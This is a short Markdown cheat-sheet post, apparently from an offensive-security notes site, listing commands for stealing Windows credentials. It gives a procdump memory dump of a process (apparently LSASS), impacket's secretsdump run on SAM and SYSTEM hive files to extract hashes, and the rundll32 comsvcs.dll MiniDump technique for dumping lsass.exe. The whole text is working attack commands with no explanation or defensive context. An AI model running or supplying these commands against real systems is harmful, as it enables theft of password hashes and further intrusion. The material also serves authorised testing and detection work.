---
layout: post
title: "Windows Creds"
tags: ["SAM","LSASS","Secrets"]
section: "Windows"

---
# Dump hashes

```powershell
.\procdump64.exe -accepteula -ma 580 out.dmp2
```

# Crack offline SAM accounts

```bash
python secretsdump.py -system "systemfile" -sam "samfile"  LOCAL
```

# DUMP

## comsvcs.dll

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
<lsass process ID> C:\Users\Public\lsass.dmp full
```